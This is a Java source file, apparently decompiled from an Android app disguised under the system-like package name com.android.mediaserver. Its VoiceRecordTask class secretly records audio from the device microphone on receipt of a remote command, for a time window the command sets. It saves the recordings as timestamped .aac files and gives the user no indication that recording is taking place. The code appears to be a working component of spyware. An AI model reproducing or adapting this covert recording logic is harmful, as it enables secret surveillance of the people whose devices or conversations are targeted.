package com.android.mediaserver.task;

import android.content.Context;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.os.Looper;
import com.android.mediaserver.command.Command;
import com.android.mediaserver.command.VoiceRecordCommand;
import com.android.mediaserver.config.Config;
import com.android.mediaserver.util.AppUtils;
import com.sromku.simple.storage.SimpleStorage;
import java.io.File;
import timber.log.Timber;

public class VoiceRecordTask extends Task implements OnInfoListener, OnErrorListener {
  private MediaRecorder mRecorder;

  public VoiceRecordTask(Command command, Context context) {
    super(command, context);
  }

  protected Void doInBackground(Void... params) {
    Timber.d("VoiceRecordTask started", new Object[0]);
    if (isValidTask()) {
      try {
        Timber.i("----- Starting media recorder -----", new Object[0]);
        if (Looper.myLooper() == null) {
          Looper.prepare();
        }
        mRecorder = new MediaRecorder();
        mRecorder.setOnErrorListener(this);
        mRecorder.setOnInfoListener(this);
        mRecorder.setAudioSource(1);
        mRecorder.setOutputFormat(6);
        mRecorder.setAudioEncoder(3);
        File outputFile = SimpleStorage.getInternalStorage(mContext.getApplicationContext())
            .getFile(Config.getInstance(mContext.getApplicationContext())
                    .getMicRecordingsDirectoryName(),
                String.valueOf(System.currentTimeMillis() / 1000) + ".aac");
        if (outputFile.exists()) {
          Timber.i("deleting old recording", new Object[0]);
          outputFile.delete();
        }
        mRecorder.setOutputFile(outputFile.getAbsolutePath());
        mRecorder.setMaxDuration(getRecordingDuration());
        mRecorder.prepare();
        mRecorder.start();
        AppUtils.setUsedFiles(mContext, outputFile.getAbsolutePath());
        publishProgress(new TaskStatus[] { TaskStatus.IN_PROGRESS });
        Looper.loop();
        AppUtils.setUsedFiles(mContext, "");
        Timber.d("-------- Finished the recording!! -------", new Object[0]);
      } catch (RuntimeException rte) {
        Timber.e(rte, "Failed to start recording", new Object[0]);
        stopMediaRecording();
      } catch (Exception e) {
        Timber.e(e, "Failed to start recording", new Object[0]);
      }
    } else {
      Timber.d("Invalid task dates, not executing", new Object[0]);
    }
    return null;
  }

  protected void onPostExecute(Void aVoid) {
    super.onPostExecute(aVoid);
  }

  public void stopMediaRecording() {
    try {
      Timber.i("----- Stopping media recorder -----", new Object[0]);
      if (mRecorder != null) {
        mRecorder.stop();
        mRecorder.reset();
        mRecorder.release();
      }
      Looper.myLooper().quit();
    } catch (Exception e) {
      Timber.e(e, "Error while stopping the recording", new Object[0]);
    }
  }

  public void onError(MediaRecorder mr, int what, int extra) {
    Timber.i("MEDIARECORDER ERROR OCCURRED", new Object[0]);
    stopMediaRecording();
    publishProgress(new TaskStatus[] { TaskStatus.FAILED });
  }

  public void onInfo(MediaRecorder mr, int what, int extra) {
    switch (what) {
      case 800:
        Timber.i("MEDIARECORDER REACHED MAX DURATION", new Object[0]);
        stopMediaRecording();
        publishProgress(new TaskStatus[] { TaskStatus.SUCCEEDED });
        return;
      case 801:
        Timber.i("MEDIARECORDER REACHED MAX FILESIZE", new Object[0]);
        stopMediaRecording();
        publishProgress(new TaskStatus[] { TaskStatus.SUCCEEDED });
        return;
      default:
        Timber.i("MEDIARECORDER NEW INFO MESSAGE", new Object[0]);
        return;
    }
  }

  private boolean isValidTask() {
    if (((VoiceRecordCommand) mCommand).getEndDate() * 1000 <= System.currentTimeMillis()) {
      return false;
    }
    return true;
  }

  private int getRecordingDuration() {
    long currentTime = System.currentTimeMillis();
    VoiceRecordCommand recordCommand = (VoiceRecordCommand) mCommand;
    long startDate = recordCommand.getDateMs();
    long endDate = recordCommand.getEndDateMs();
    if (endDate <= currentTime) {
      return 0;
    }
    if (startDate >= currentTime) {
      return (int) (endDate - startDate);
    }
    return (int) (endDate - currentTime);
  }
}
